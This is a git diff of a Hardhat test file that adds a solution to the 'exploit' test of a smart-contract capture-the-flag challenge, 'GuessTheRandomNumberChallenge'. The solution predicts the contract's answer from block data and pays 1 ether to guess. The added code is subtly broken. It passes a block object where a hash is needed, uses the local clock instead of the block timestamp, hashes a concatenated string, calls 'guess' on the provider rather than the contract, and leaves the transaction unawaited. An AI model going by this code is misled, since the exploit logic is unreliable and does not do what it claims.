@@ -1,8 +1,9 @@
 import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 import { expect } from 'chai';
-import { Contract } from 'ethers';
+import { Contract, providers } from 'ethers';
 import { ethers, network } from 'hardhat';
 const { utils, provider } = ethers;
+import { keccak256 } from 'ethers/lib/utils';
 
 describe('GuessTheRandomNumberChallenge', () => {
   let target: Contract;
@@ -24,9 +25,13 @@ describe('GuessTheRandomNumberChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    
+    const blockNumber = await provider.getBlockNumber() -1;
+    const blockHash = await provider.getBlock(blockNumber);
+    const timestamp = Math.floor(Date.now() / 1000);
+    const answer = keccak256(blockHash + timestamp.toString());
+    const tx = await provider.guess(answer, {value : utils.parseEther('1')});
+    tx.wait();
 
     expect(await target.isComplete()).to.equal(true);
   });
